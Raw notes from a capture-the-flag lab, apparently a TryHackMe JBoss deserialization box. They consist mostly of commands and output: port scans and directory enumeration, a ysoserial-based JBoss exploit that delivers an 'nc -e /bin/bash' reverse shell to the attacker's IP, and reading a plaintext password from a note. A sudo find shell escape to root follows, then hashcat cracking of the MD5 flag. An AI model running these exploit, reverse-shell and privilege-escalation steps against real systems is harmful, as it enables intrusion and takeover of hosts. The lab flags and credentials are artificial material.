```
nmap -T4 -n -sV -sC -Pn -p- 10.48.185.213
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-21 07:49 -0400
Nmap scan report for 10.48.185.213
Host is up (0.075s latency).
Not shown: 65518 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:97:8c:b9:74:d0:f3:9e:fe:f3:a5:ea:f8:a9:b5:7a (DSA)
|   2048 33:a4:7b:91:38:58:50:30:89:2d:e4:57:bb:07:bb:2f (RSA)
|   256 21:01:8b:37:f5:1e:2b:c5:57:f1:b0:42:b7:32:ab:ea (ECDSA)
|_  256 f6:36:07:3c:3b:3d:71:30:c4:cd:2a:13:00:b5:25:ae (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Tony&#39;s Blog
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-generator: Hugo 0.66.0
1090/tcp open  java-rmi    Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1091/tcp open  java-rmi    Java RMI
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     #http://thm-java-deserial.home:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpwA
|     UnicastRef2
|_    thm-java-deserial.home
3873/tcp open  java-object Java Object Serialization
4446/tcp open  java-object Java Object Serialization
4712/tcp open  msdtc       Microsoft Distributed Transaction Coordinator (error)
4713/tcp open  pulseaudio?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, oracle-tns: 
|_    126a
5445/tcp open  smbdirect?
5455/tcp open  apc-5455?
5500/tcp open  hotline?
| fingerprint-strings: 
|   DNSStatusRequestTCP, GenericLines, NULL: 
|     GSSAPI
|     DIGEST-MD5
|     NTLM
|     CRAM-MD5
|     thm-java-deserial
|   DNSVersionBindReqTCP: 
|     DIGEST-MD5
|     GSSAPI
|     NTLM
|     CRAM-MD5
|     thm-java-deserial
|   GetRequest: 
|     GSSAPI
|     DIGEST-MD5
|     CRAM-MD5
|     NTLM
|     thm-java-deserial
|   HTTPOptions: 
|     GSSAPI
|     NTLM
|     CRAM-MD5
|     DIGEST-MD5
|     thm-java-deserial
|   Help: 
|     DIGEST-MD5
|     CRAM-MD5
|     GSSAPI
|     NTLM
|     thm-java-deserial
|   Kerberos, RPCCheck: 
|     DIGEST-MD5
|     NTLM
|     GSSAPI
|     CRAM-MD5
|     thm-java-deserial
|   RTSPRequest: 
|     CRAM-MD5
|     GSSAPI
|     DIGEST-MD5
|     NTLM
|     thm-java-deserial
|   SSLSessionReq: 
|     NTLM
|     CRAM-MD5
|     DIGEST-MD5
|     GSSAPI
|     thm-java-deserial
|   TLSSessionReq: 
|     NTLM
|     CRAM-MD5
|     GSSAPI
|     DIGEST-MD5
|     thm-java-deserial
|   TerminalServerCookie: 
|     GSSAPI
|     CRAM-MD5
|     DIGEST-MD5
|     NTLM
|_    thm-java-deserial
5501/tcp open  tcpwrapped
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-title: Welcome to JBoss AS
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
8083/tcp open  http        JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.99%I=7%D=6/21%Time=6A37D272%P=x86_64-pc-linux-gnu%r(NU
SF:LL,17B,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x97
SF:\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objByt
SF:esq\0~\0\x01xp\xfd!\xe3Cur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\0\
SF:0xp\0\0\x004\xac\xed\0\x05t\0#http://thm-java-deserial\.home:8083/q\0~\
SF:0\0q\0~\0\0uq\0~\0\x03\0\0\0\xcd\xac\xed\0\x05sr\0\x20org\.jnp\.server\
SF:.NamingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.server\.
SF:RemoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.serve
SF:r\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpwA\0\x0bUnicastRef2\0\0
SF:\x16thm-java-deserial\.home\0\0\x04J\x81Z\\\\&\xd8D\xb4\xdc\x9e\x81\(\0
SF:\0\x01\x9e\xe9\xfb\xac~\x80\x02\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3873-TCP:V=7.99%I=7%D=6/21%Time=6A37D278%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.99%I=7%D=6/21%Time=6A37D278%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4713-TCP:V=7.99%I=7%D=6/21%Time=6A37D278%P=x86_64-pc-linux-gnu%r(NU
SF:LL,5,"126a\n")%r(GenericLines,5,"126a\n")%r(GetRequest,5,"126a\n")%r(HT
SF:TPOptions,5,"126a\n")%r(RTSPRequest,5,"126a\n")%r(RPCCheck,5,"126a\n")%
SF:r(DNSVersionBindReqTCP,5,"126a\n")%r(DNSStatusRequestTCP,5,"126a\n")%r(
SF:Help,5,"126a\n")%r(SSLSessionReq,5,"126a\n")%r(TerminalServerCookie,5,"
SF:126a\n")%r(TLSSessionReq,5,"126a\n")%r(Kerberos,5,"126a\n")%r(SMBProgNe
SF:g,5,"126a\n")%r(X11Probe,5,"126a\n")%r(FourOhFourRequest,5,"126a\n")%r(
SF:LPDString,5,"126a\n")%r(LDAPSearchReq,5,"126a\n")%r(LDAPBindReq,5,"126a
SF:\n")%r(SIPOptions,5,"126a\n")%r(LANDesk-RC,5,"126a\n")%r(TerminalServer
SF:,5,"126a\n")%r(NCP,5,"126a\n")%r(NotesRPC,5,"126a\n")%r(JavaRMI,5,"126a
SF:\n")%r(WMSRequest,5,"126a\n")%r(oracle-tns,5,"126a\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5500-TCP:V=7.99%I=7%D=6/21%Time=6A37D278%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GSS
SF:API\x01\nDIGEST-MD5\x01\x04NTLM\x01\x08CRAM-MD5\x02\x11thm-java-deseria
SF:l")%r(GenericLines,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\
SF:0\x02\x01\x06GSSAPI\x01\nDIGEST-MD5\x01\x04NTLM\x01\x08CRAM-MD5\x02\x11
SF:thm-java-deserial")%r(GetRequest,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x0
SF:3\x03\x04\0\0\0\x02\x01\x06GSSAPI\x01\nDIGEST-MD5\x01\x08CRAM-MD5\x01\x
SF:04NTLM\x02\x11thm-java-deserial")%r(HTTPOptions,4B,"\0\0\0G\0\0\x01\0\x
SF:03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GSSAPI\x01\x04NTLM\x01\x08CRA
SF:M-MD5\x01\nDIGEST-MD5\x02\x11thm-java-deserial")%r(RTSPRequest,4B,"\0\0
SF:\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x08CRAM-MD5\x01\x
SF:06GSSAPI\x01\nDIGEST-MD5\x01\x04NTLM\x02\x11thm-java-deserial")%r(RPCCh
SF:eck,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIGE
SF:ST-MD5\x01\x04NTLM\x01\x06GSSAPI\x01\x08CRAM-MD5\x02\x11thm-java-deseri
SF:al")%r(DNSVersionBindReqTCP,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03
SF:\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x06GSSAPI\x01\x04NTLM\x01\x08CRAM-MD
SF:5\x02\x11thm-java-deserial")%r(DNSStatusRequestTCP,4B,"\0\0\0G\0\0\x01\
SF:0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GSSAPI\x01\nDIGEST-MD5\x01
SF:\x04NTLM\x01\x08CRAM-MD5\x02\x11thm-java-deserial")%r(Help,4B,"\0\0\0G\
SF:0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x08CR
SF:AM-MD5\x01\x06GSSAPI\x01\x04NTLM\x02\x11thm-java-deserial")%r(SSLSessio
SF:nReq,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04N
SF:TLM\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x06GSSAPI\x02\x11thm-java-deser
SF:ial")%r(TerminalServerCookie,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x0
SF:3\x04\0\0\0\x02\x01\x06GSSAPI\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x04NT
SF:LM\x02\x11thm-java-deserial")%r(TLSSessionReq,4B,"\0\0\0G\0\0\x01\0\x03
SF:\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x08CRAM-MD5\x01\x06GSS
SF:API\x01\nDIGEST-MD5\x02\x11thm-java-deserial")%r(Kerberos,4B,"\0\0\0G\0
SF:\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x04NTL
SF:M\x01\x06GSSAPI\x01\x08CRAM-MD5\x02\x11thm-java-deserial");
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows



```


![[Screenshot_5.png]]


```
gobuster dir -u http://tony.thm:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://tony.thm:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
images               (Status: 302) [Size: 0] [--> http://tony.thm:8080/images/]
css                  (Status: 302) [Size: 0] [--> http://tony.thm:8080/css/]
manager              (Status: 302) [Size: 0] [--> http://tony.thm:8080/manager/]
Progress: 38172 / 
```

![[Screenshot_6.png]]


```
strings be2sOV9.jpeg 



^e1#
(jIe9
QO)l
i,`I
"[ nM
`y(a
Xy(0
}THM{Tony_Sure_Loves_Frosted_Flakes}
'THM{Tony_Sure_Loves_Frosted_Flakes}(dQ
PtKN
A1rW

```

```
─(root㉿kali)-[/home/…/Desktop/Tryhackme/tony/jboss]
└─# python2 exploit.py 10.48.185.213:8080 "nc -e /bin/bash 192.168.128.61 4444" --proto http --ysoserial-path ysoserial.jar
[*] Target IP: 10.48.185.213
[*] Target PORT: 8080
[+] Command executed successfully

```

```

nc -lvnp 4444  
listening on [any] 4444 ...
connect to [192.168.128.61] from (UNKNOWN) [10.48.185.213] 51314
/bin/bash
id
uid=1000(cmnatic) gid=1000(cmnatic) groups=1000(cmnatic),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare)
pwd
/
whoami
cmnatic
python -c 'import pty; pty.spawn("/bin/bash")'
cmnatic@thm-java-deserial:/$ ls
ls
bin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var
boot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz
cmnatic@thm-java-deserial:/$ cd home
cd home
cmnatic@thm-java-deserial:/home$ ls
ls
cmnatic  jboss  tony
cmnatic@thm-java-deserial:/home$ cd tony
cd tony
cmnatic@thm-java-deserial:/home/tony$ ls
ls
cmnatic@thm-java-deserial:/home/tony$ ls -la
ls -la
total 36
drwxr-xr-x 3 tony tony 4096 Mar  6  2020 .
drwxr-xr-x 5 root root 4096 Mar  6  2020 ..
-rw------- 1 tony tony   63 Mar  6  2020 .Xauthority
-rw------- 1 tony tony  341 Mar  7  2020 .bash_history
-rw-r--r-- 1 tony tony  220 Mar  6  2020 .bash_logout
-rw-r--r-- 1 tony tony 3637 Mar  6  2020 .bashrc
drwx------ 2 tony tony 4096 Mar  6  2020 .cache
-rw------- 1 tony tony   10 Mar  7  2020 .nano_history
-rw-r--r-- 1 tony tony  675 Mar  6  2020 .profile
cmnatic@thm-java-deserial:/home/tony$ cat .bash_history
cat .bash_history
cat: .bash_history: Permission denied
cmnatic@thm-java-deserial:/home/tony$ cd ..    
cd ..
cmnatic@thm-java-deserial:/home$ cd cmnatic
cd cmnatic
cmnatic@thm-java-deserial:~$ ls 
ls 
jboss  to-do.txt
cmnatic@thm-java-deserial:~$ cat to-do.txt
cat to-do.txt
I like to keep a track of the various things I do throughout the day.

Things I have done today:
 - Added a note for JBoss to read for when he next logs in.
 - Helped Tony setup his website!
 - Made sure that I am not an administrator account 

Things to do:
 - Update my Java! I've heard it's kind of in-secure, but it's such a headache to update. Grrr!



cmnatic@thm-java-deserial:~$ ls
ls
jboss  to-do.txt
cmnatic@thm-java-deserial:~$ cd jboss
cd jboss
cmnatic@thm-java-deserial:~/jboss$ ls
ls
LICENSE.txt  bin     common         docs              lib
README.txt   client  copyright.txt  jar-versions.xml  server
cmnatic@thm-java-deserial:~/jboss$ ls -la
ls -la
total 284
drwxrwxr-x 8 cmnatic cmnatic   4096 Aug 16  2011 .
drwxr-xr-x 5 cmnatic cmnatic   4096 Mar  7  2020 ..
-rw-rw-r-- 1 cmnatic cmnatic  26530 Aug 16  2011 LICENSE.txt
-rw-rw-r-- 1 cmnatic cmnatic   2551 Aug 16  2011 README.txt
drwxrwxr-x 3 cmnatic cmnatic   4096 Aug 16  2011 bin
drwxrwxr-x 2 cmnatic cmnatic  12288 Aug 16  2011 client
drwxrwxr-x 4 cmnatic cmnatic   4096 Aug 16  2011 common
-rw-rw-r-- 1 cmnatic cmnatic   6135 Aug 16  2011 copyright.txt
drwxrwxr-x 6 cmnatic cmnatic   4096 Aug 16  2011 docs
-rw-rw-r-- 1 cmnatic cmnatic 205077 Aug 16  2011 jar-versions.xml
drwxrwxr-x 3 cmnatic cmnatic   4096 Aug 16  2011 lib
drwxrwxr-x 8 cmnatic cmnatic   4096 Mar  4  2020 server
cmnatic@thm-java-deserial:~/jboss$ ls 
ls 
LICENSE.txt  bin     common         docs              lib
README.txt   client  copyright.txt  jar-versions.xml  server
cmnatic@thm-java-deserial:~/jboss$ cd ..
cd ..
cmnatic@thm-java-deserial:~$ ls
ls
jboss  to-do.txt
cmnatic@thm-java-deserial:~$ cd ..
cd ..
cmnatic@thm-java-deserial:/home$ ls
ls
cmnatic  jboss  tony
cmnatic@thm-java-deserial:/home$ cd jboss
cd jboss
cmnatic@thm-java-deserial:/home/jboss$ ls
ls
note
cmnatic@thm-java-deserial:/home/jboss$ ls -la  
ls -la
total 36
drwxr-xr-x 3 jboss   jboss   4096 Mar  7  2020 .
drwxr-xr-x 5 root    root    4096 Mar  6  2020 ..
-rwxrwxrwx 1 jboss   jboss    181 Mar  7  2020 .bash_history
-rw-r--r-- 1 jboss   jboss    220 Mar  6  2020 .bash_logout
-rw-r--r-- 1 jboss   jboss   3637 Mar  6  2020 .bashrc
drwx------ 2 jboss   jboss   4096 Mar  7  2020 .cache
-rw-rw-r-- 1 cmnatic cmnatic   38 Mar  6  2020 .jboss.txt
-rw-r--r-- 1 jboss   jboss    675 Mar  6  2020 .profile
-rw-r--r-- 1 cmnatic cmnatic  368 Mar  6  2020 note
cmnatic@thm-java-deserial:/home/jboss$ cat .jboss.txt
cat .jboss.txt
THM{50c10ad46b5793704601ecdad865eb06}
cmnatic@thm-java-deserial:/home/jboss$ cd note
cd note
bash: cd: note: Not a directory
cmnatic@thm-java-deserial:/home/jboss$ ls
ls
note
cmnatic@thm-java-deserial:/home/jboss$ cat note
cat note
Hey JBoss!

Following your email, I have tried to replicate the issues you were having with the system.

However, I don't know what commands you executed - is there any file where this history is stored that I can access?

Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)

Password: likeaboss

Kind Regards,
CMNatic
cmnatic@thm-java-deserial:/home/jboss$ 

```


```
 ssh jboss@10.48.185.213                                                                                
The authenticity of host '10.48.185.213 (10.48.185.213)' can't be established.
ED25519 key fingerprint is: SHA256:vyntdEjxp6aE/lZ35pCYGR3J8QxXrzUpj9eWpK+qCP8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.48.185.213' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
jboss@10.48.185.213's password: 
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sun Jun 21 12:40:10 BST 2026

  System load:  0.31               Processes:           103
  Usage of /:   10.5% of 18.58GB   Users logged in:     0
  Memory usage: 3%                 IP address for eth0: 10.48.185.213
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Your Hardware Enablement Stack (HWE) is supported until April 2019.
Last login: Sat Mar  7 00:35:29 2020
jboss@thm-java-deserial:~$ id
uid=1001(jboss) gid=1001(jboss) groups=1001(jboss)
jboss@thm-java-deserial:~$ sudo -l
Matching Defaults entries for jboss on thm-java-deserial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jboss may run the following commands on thm-java-deserial:
    (ALL) NOPASSWD: /usr/bin/find
jboss@thm-java-deserial:~$ sudo find . -exec /bin/sh -p \; -quit
/bin/sh: 0: Illegal option -p
/bin/sh: 0: Illegal option -p
/bin/sh: 0: Illegal option -p
/bin/sh: 0: Illegal option -p
/bin/sh: 0: Illegal option -p
/bin/sh: 0: Illegal option -p
/bin/sh: 0: Illegal option -p
/bin/sh: 0: Illegal option -p
/bin/sh: 0: Illegal option -p
jboss@thm-java-deserial:~$ sudo find . -exec /bin/bash \; -quit
root@thm-java-deserial:~# id
uid=0(root) gid=0(root) groups=0(root)
root@thm-java-deserial:~# pwd
/home/jboss
root@thm-java-deserial:~# cd ../../
root@thm-java-deserial:/# ls
bin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz
root@thm-java-deserial:/# cd root
root@thm-java-deserial:/root# ls
root.txt
root@thm-java-deserial:/root# cat root
cat: root: No such file or directory
root@thm-java-deserial:/root# cat root.txt
QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
root@thm-java-deserial:/root# 

```

![[Screenshot_7.png]]

```
 hashcat -a 0 -m 0 BC77AC072EE30E3760806864E234C7CF /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i5-1335U, 2463/4926 MB (1024 MB allocatable), 7MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (3657 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

bc77ac072ee30e3760806864e234c7cf:zxcvbnm123456789         
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: bc77ac072ee30e3760806864e234c7cf
Time.Started.....: Sun Jun 21 09:48:58 2026 (0 secs)
Time.Estimated...: Sun Jun 21 09:48:58 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3496.1 kH/s (0.39ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 236544/14344385 (1.65%)
Rejected.........: 0/236544 (0.00%)
Restore.Point....: 229376/14344385 (1.60%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 170176 -> pink panther
Hardware.Mon.#01.: Util:  9%

Started: Sun Jun 21 09:48:56 2026
Stopped: Sun Jun 21 09:49:00 2026
 

```


